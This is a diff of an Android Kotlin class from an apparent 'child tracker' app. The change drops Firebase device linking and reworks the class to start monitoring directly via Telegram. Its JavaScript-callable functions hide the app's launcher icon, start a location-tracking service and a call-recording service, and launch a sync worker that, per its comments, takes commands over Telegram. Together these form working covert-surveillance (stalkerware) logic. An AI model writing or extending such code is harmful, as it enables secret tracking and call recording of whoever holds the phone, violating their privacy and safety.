@@ -8,138 +8,36 @@ import android.os.Build
 import android.provider.Settings
 import android.util.Log
 import android.webkit.JavascriptInterface
-import com.google.firebase.auth.FirebaseAuth
-import com.google.firebase.firestore.FirebaseFirestore
-import com.google.firebase.firestore.FirebaseFirestoreException
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.launch
-import kotlinx.coroutines.tasks.await
 import com.abuzahra.tracker.services.MainTrackerService
 import com.abuzahra.tracker.services.CallRecorderService
 import com.abuzahra.tracker.services.DataSyncWorker
 
 /**
  * ChildWebInterface - واجهة الويب لربط JavaScript بـ Android
- * يتعامل مع:
- * 1. ربط الجهاز بـ Firebase (النظام القديم)
- * 2. تسجيل الجهاز في سيرفر البوت (النظام الجديد)
- * 3. بدء جميع الخدمات
- * 4. إخفاء التطبيق
+ * الإصدار الجديد: اتصال مباشر بتيليجرام بدون Firebase أو سيرفر وسيط
  */
 class ChildWebInterface(private val mContext: Context) {
-    private val auth = FirebaseAuth.getInstance()
-    private val db = FirebaseFirestore.getInstance()
 
     @JavascriptInterface
-    fun linkDevice(code: String) {
-        CoroutineScope(Dispatchers.IO).launch {
-            try {
-                // === الخطوة 1: التحقق من كود الربط في Firebase ===
-                val doc = db.collection("linking_codes").document(code).get().await()
-                if (!doc.exists()) {
-                    sendResult("window.onLinkError('الكود غير صحيح.')")
-                    return@launch
-                }
-
-                val parentUid = doc.getString("parent_uid")
-                if (parentUid.isNullOrEmpty()) {
-                    sendResult("window.onLinkError('خطأ في البيانات.')")
-                    return@launch
-                }
-
-                // === الخطوة 2: المصادقة المجهولة ===
-                if (auth.currentUser == null) {
-                    try {
-                        auth.signInAnonymously().await()
-                    } catch (e: Exception) {
-                        sendResult("window.onLinkError('فشل المصادقة.')")
-                        return@launch
-                    }
-                }
-
-                // === الخطوة 3: حفظ بيانات الجهاز في Firebase ===
-                val deviceId = Settings.Secure.getString(mContext.contentResolver, Settings.Secure.ANDROID_ID)
-                val deviceName = Build.MODEL
-                val brand = Build.BRAND
-                val osVersion = "Android ${Build.VERSION.RELEASE}"
-
-                val deviceData = mapOf(
-                    "device_id" to deviceId,
-                    "last_seen" to System.currentTimeMillis(),
-                    "app_name" to "Child Device",
-                    "device_model" to deviceName,
-                    "brand" to brand,
-                    "os_version" to osVersion
-                )
-
-                try {
-                    db.collection("parents").document(parentUid)
-                        .collection("children").document(deviceId)
-                        .set(deviceData).await()
-                } catch (e: FirebaseFirestoreException) {
-                    sendResult("window.onLinkError('اضغط PUBLISH في قواعد Firebase.')")
-                    return@launch
-                }
-
-                // حذف كود الربط
-                db.collection("linking_codes").document(code).delete().await()
-
-                // حفظ بيانات الربط محلياً
-                SharedPrefsManager.saveData(mContext, parentUid, deviceId)
-                SharedPrefsManager.setLinkCode(mContext, code)
-
-                // === الخطوة 4: تسجيل الجهاز في سيرفر البوت ===
-                try {
-                    val registered = BotServerClient.registerDevice(mContext, code)
-                    if (registered) {
-                        Log.d("ChildApp", "تم تسجيل الجهاز في سيرفر البوت بنجاح")
-                    } else {
-                        Log.w("ChildApp", "فشل تسجيل الجهاز في سيرفر البوت - سيتم المحاولة لاحقاً")
-                    }
-                } catch (e: Exception) {
-                    Log.e("ChildApp", "خطأ في تسجيل سيرفر البوت: ${e.message}")
-                    // لا نمنع الربط إذا فشل تسجيل البوت - Firebase يعمل كبديل
-                }
-
-                // === الخطوة 5: بدء جميع الخدمات ===
-                startAllServices()
-
-                sendResult("window.onLinkSuccess()")
-
-            } catch (e: Exception) {
-                sendResult("window.onLinkError('خطأ: ${e.message}')")
-            }
-        }
+    fun requestAllPermissions() {
+        // هذه الدالة تُستدعى من زر "بدء التفعيل"
+        // الأذونات يتم طلبها فعلياً من MainActivity عبر onResume chain
+        Log.d("ChildApp", "requestAllPermissions called from JS")
     }
 
     @JavascriptInterface
     fun startServices() {
         startAllServices()
-        // محاولة تسجيل الجهاز في سيرفر البوت إذا لم يتم تسجيله
-        val linkCode = SharedPrefsManager.getLinkCode(mContext)
-        if (linkCode != null && !SharedPrefsManager.isBotRegistered(mContext)) {
-            CoroutineScope(Dispatchers.IO).launch {
-                try {
-                    BotServerClient.registerDevice(mContext, linkCode)
-                } catch (e: Exception) {
-                    Log.e("ChildApp", "خطأ في إعادة تسجيل البوت: ${e.message}")
-                }
-            }
-        }
+        Log.d("ChildApp", "بدء جميع الخدمات من WebView")
     }
 
     @JavascriptInterface
     fun hideApp() {
-        Log.d("ChildApp", "Hide App Button Clicked")
-
+        Log.d("ChildApp", "إخفاء التطبيق")
         try {
             val pkg = mContext.packageManager
             val aliasName = ComponentName(mContext, mContext.packageName + ".LauncherAlias")
 
-            Log.d("ChildApp", "Attempting to disable: " + aliasName.flattenToString())
-
-            // إخفاء الأيقونة
             pkg.setComponentEnabledSetting(
                 aliasName,
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
@@ -147,44 +45,84 @@ class ChildWebInterface(private val mContext: Context) {
             )
 
             sendResult("window.onAppHidden()")
-
-            (mContext as MainActivity).finish()
-
+            // إغلاق النشاط
+            val intent = Intent(Intent.ACTION_MAIN)
+            intent.addCategory(Intent.CATEGORY_HOME)
+            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+            mContext.startActivity(intent)
         } catch (e: Exception) {
-            Log.e("ChildApp", "Failed to hide app", e)
+            Log.e("ChildApp", "فشل الإخفاء", e)
             sendResult("window.onAppError('${e.message}')")
         }
     }
 
     /**
-     * بدء جميع الخدمات (التتبع، تسجيل المكالمات، مزامنة البيانات)
+     * بدء جميع الخدمات مباشرة - بدون أي ربط Firebase
      */
-    private fun startAllServices() {
-        // خدمة التتبع الرئيسية
-        val intent = Intent(mContext, MainTrackerService::class.java)
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            mContext.startForegroundService(intent)
-        } else {
-            mContext.startService(intent)
-        }
+    fun startAllServices() {
+        try {
+            // 1. حفظ معرف الجهاز محلياً (يُستخدم لاحقاً للتعرف على الجهاز)
+            ensureDeviceId()
 
-        // خدمة تسجيل المكالمات
-        val recIntent = Intent(mContext, CallRecorderService::class.java)
-        recIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            mContext.startForegroundService(recIntent)
-        } else {
-            mContext.startService(recIntent)
-        }
+            // 2. خدمة التتبع الرئيسية
+            val intent = Intent(mContext, MainTrackerService::class.java)
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                mContext.startForegroundService(intent)
+            } else {
+                mContext.startService(intent)
+            }
 
-        // بدء مزامنة البيانات (التحقق من الأوامر كل 30 ثانية)
-        DataSyncWorker.startImmediate(mContext)
+            // 3. خدمة تسجيل المكالمات
+            val recIntent = Intent(mContext, CallRecorderService::class.java)
+            recIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                mContext.startForegroundService(recIntent)
+            } else {
+                mContext.startService(recIntent)
+            }
+
+            // 4. بدء مزامنة البيانات (الاتصال بتيليجرام)
+            DataSyncWorker.startImmediate(mContext)
+
+            Log.d("ChildApp", "تم بدء جميع الخدمات مباشرة")
+        } catch (e: Exception) {
+            Log.e("ChildApp", "خطأ في بدء الخدمات: ${e.message}", e)
+        }
+    }
+
+    /**
+     * التأكد من وجود معرف جهاز فريد
+     */
+    private fun ensureDeviceId() {
+        val existingId = SharedPrefsManager.getDeviceId(mContext)
+        if (existingId == null) {
+            val androidId = Settings.Secure.getString(
+                mContext.contentResolver,
+                Settings.Secure.ANDROID_ID
+            ) ?: System.currentTimeMillis().toString()
+
+            // حفظ معرف الجهاز محلياً
+            val prefs = mContext.getSharedPreferences("child_prefs", Context.MODE_PRIVATE)
+            prefs.edit().apply {
+                putString("device_id", androidId)
+                putString("parent_uid", "direct_telegram")
+                apply()
+            }
+            Log.d("ChildApp", "تم إنشاء معرف جهاز: $androidId")
+        }
     }
 
     private fun sendResult(js: String) {
-        CoroutineScope(Dispatchers.Main).launch {
-            (mContext as MainActivity).webView.evaluateJavascript(js, null)
+        try {
+            val activity = mContext
+            if (activity is MainActivity) {
+                activity.runOnUiThread {
+                    activity.webView.evaluateJavascript(js, null)
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("ChildApp", "خطأ في sendResult: ${e.message}")
         }
     }
 }
